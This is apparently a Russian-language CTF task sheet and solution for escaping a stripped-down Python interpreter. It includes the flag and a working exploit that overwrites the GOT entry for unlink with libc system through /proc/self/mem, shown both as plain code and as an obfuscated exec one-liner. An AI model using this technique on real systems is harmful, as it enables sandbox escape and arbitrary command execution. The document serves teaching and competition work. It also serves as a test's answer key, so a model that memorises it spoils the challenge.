# Название: Bare Minimal Python
### ВЫДАТЬ УЧАСТНИКАМ sources.zip
### Флаг: **CTF{PyTh0N_1s_s0_1nt3r3st1ng}**
### Описание
Проснувшись утром, я обнаружил на взломанном компьютере интересный бинарник:
САМЫЙ ПЕРЕДОВОЙ ПИТОН ИНТЕРПРЕТАТОР! САМАЯ БЫСТРАЯ СКОРОСТЬ ВЫПОЛНЕНИЯ! САМАЯ НАДЁЖНАЯ ЗАЩИТА (а вот тут следовало бы выяснить поподробнее)
#### Примечание 1: Для получения флага вам нужно запустить бинарник `/give_me_flag`. Реверсить и всячески исследовать его не надо, это простая "читалка" единственного файла с флагом, на котором стоит SUID бит.
#### Примечание 2: В Dockerfile зафиксирована версия базового образа через хеш sha256 (`ubuntu@sha256:...`). Это гарантирует возможность получить такую же среду, как на нашем сервере.
#### Примечание 3: xinetd - служебный файл, необходимый для развертывания на сервере. В нём нет уязвимостей.

### Хинт: got table hooking
### Решение
Был изменён файл posixmodule.c, а также удалены все модули, кроме encodings, т.к. без него Python запускаться отказался.  
Также "заблокированы" (не вносятся в итоговую сборку, т.к. не присутствуют в файле `posix_methods`) все функции из модуля `os`, кроме:
```c
// I EVEN DISABLED THOSE SHADY METHODS
// ONLY BARE MINIMUM REMAINS
static PyMethodDef posix_methods[] = {

    OS_LISTDIR_METHODDEF
    OS_STAT_METHODDEF
    OS_FSPATH_METHODDEF
    OS_MKDIR_METHODDEF
    OS_OPEN_METHODDEF
    OS_CLOSE_METHODDEF
    OS_REPLACE_METHODDEF
    OS_SCANDIR_METHODDEF
    OS_UNLINK_METHODDEF
    OS_RMDIR_METHODDEF
    OS_LSTAT_METHODDEF
    OS_GETCWD_METHODDEF
    {NULL,              NULL}            /* Sentinel */
};
```
Также по всем методам, позволяющим запускать процессы, расставлены return-ы в самом начале с комментариями вида "так просто не получится" (но это не играет никакого значения, т.к. данные методы запустить не удастся из-за отсутствия в итоговой сборке).
```
static PyObject *
os_execve_impl(PyObject *module, path_t *path, PyObject *argv, PyObject *env)
/*[clinic end generated code: output=ff9fa8e4da8bde58 input=626804fa092606d9]*/
{
    return 0xCAFE; // no way bro
```
Негусто, но можно переписать GOT таблицу, тем самым подменив функцию из libc на нужную (python будет "думать", что вызывается напр. ф-ция unlink, а по факту вызовется system)
```python
m=open('/proc/self/maps','r') # to bypass ASLR
map=m.read().splitlines(keepends=False)
m.close()
for st in map:
    if '/usr/lib/x86_64-linux-gnu/libc.so.6' in st: # first libc str
        RES = st
        break

BASE_LIBC = int(RES.split('-')[0], 16) # libc base
ADDR_SYSTEM = 0x7ff997dedd60 - 0x7ff997d9d000 + BASE_LIBC

BASE_GOT = int(map[0].split('-')[0], 16) # SYSTEM LIBC
ADDR_GOT = 0x5578ea82ca50 - 0x5578ea397000 + BASE_GOT

print('got(unlink):', hex(ADDR_GOT), 'system:', hex(ADDR_SYSTEM))

import os
f = open('/proc/self/mem','wb')
f.seek(ADDR_GOT) # seek to chdir
f.write((ADDR_SYSTEM).to_bytes(8,'little')) # mock unlink with system libc func
f.close()
os.unlink("/bin/sh") # fake unlink (now points to system)
```


Однострочник для избежания проблем со вставкой табуляции:
```
exec(''.join([chr(q) for q in [109,61,111,112,101,110,40,39,47,112,114,111,99,47,115,101,108,102,47,109,97,112,115,39,44,39,114,39,41,32,35,32,116,111,32,98,121,112,97,115,115,32,65,83,76,82,10,109,97,112,61,109,46,114,101,97,100,40,41,46,115,112,108,105,116,108,105,110,101,115,40,107,101,101,112,101,110,100,115,61,70,97,108,115,101,41,10,109,46,99,108,111,115,101,40,41,10,102,111,114,32,115,116,32,105,110,32,109,97,112,58,10,32,32,32,32,105,102,32,39,47,117,115,114,47,108,105,98,47,120,56,54,95,54,52,45,108,105,110,117,120,45,103,110,117,47,108,105,98,99,46,115,111,46,54,39,32,105,110,32,115,116,58,32,35,32,102,105,114,115,116,32,108,105,98,99,32,115,116,114,10,32,32,32,32,32,32,32,32,82,69,83,32,61,32,115,116,10,32,32,32,32,32,32,32,32,98,114,101,97,107,10,10,66,65,83,69,95,76,73,66,67,32,61,32,105,110,116,40,82,69,83,46,115,112,108,105,116,40,39,45,39,41,91,48,93,44,32,49,54,41,32,35,32,108,105,98,99,32,98,97,115,101,10,65,68,68,82,95,83,89,83,84,69,77,32,61,32,48,120,55,102,102,57,57,55,100,101,100,100,54,48,32,45,32,48,120,55,102,102,57,57,55,100,57,100,48,48,48,32,43,32,66,65,83,69,95,76,73,66,67,10,10,66,65,83,69,95,71,79,84,32,61,32,105,110,116,40,109,97,112,91,48,93,46,115,112,108,105,116,40,39,45,39,41,91,48,93,44,32,49,54,41,32,35,32,83,89,83,84,69,77,32,76,73,66,67,10,65,68,68,82,95,71,79,84,32,61,32,48,120,53,53,55,56,101,97,56,50,99,97,53,48,32,45,32,48,120,53,53,55,56,101,97,51,57,55,48,48,48,32,43,32,66,65,83,69,95,71,79,84,10,10,112,114,105,110,116,40,39,103,111,116,40,117,110,108,105,110,107,41,58,39,44,32,104,101,120,40,65,68,68,82,95,71,79,84,41,44,32,39,115,121,115,116,101,109,58,39,44,32,104,101,120,40,65,68,68,82,95,83,89,83,84,69,77,41,41,10,10,105,109,112,111,114,116,32,111,115,10,102,32,61,32,111,112,101,110,40,39,47,112,114,111,99,47,115,101,108,102,47,109,101,109,39,44,39,119,98,39,41,10,102,46,115,101,101,107,40,65,68,68,82,95,71,79,84,41,32,35,32,115,101,101,107,32,116,111,32,99,104,100,105,114,10,102,46,119,114,105,116,101,40,40,65,68,68,82,95,83,89,83,84,69,77,41,46,116,111,95,98,121,116,101,115,40,56,44,39,108,105,116,116,108,101,39,41,41,32,35,32,109,111,99,107,32,117,110,108,105,110,107,32,119,105,116,104,32,115,121,115,116,101,109,32,108,105,98,99,32,102,117,110,99,10,102,46,99,108,111,115,101,40,41,10,111,115,46,117,110,108,105,110,107,40,34,47,98,105,110,47,115,104,34,41,32,35,32,102,97,107,101,32,117,110,108,105,110,107,32,40,110,111,119,32,112,111,105,110,116,115,32,116,111,32,115,121,115,116,101,109,41]]))
```
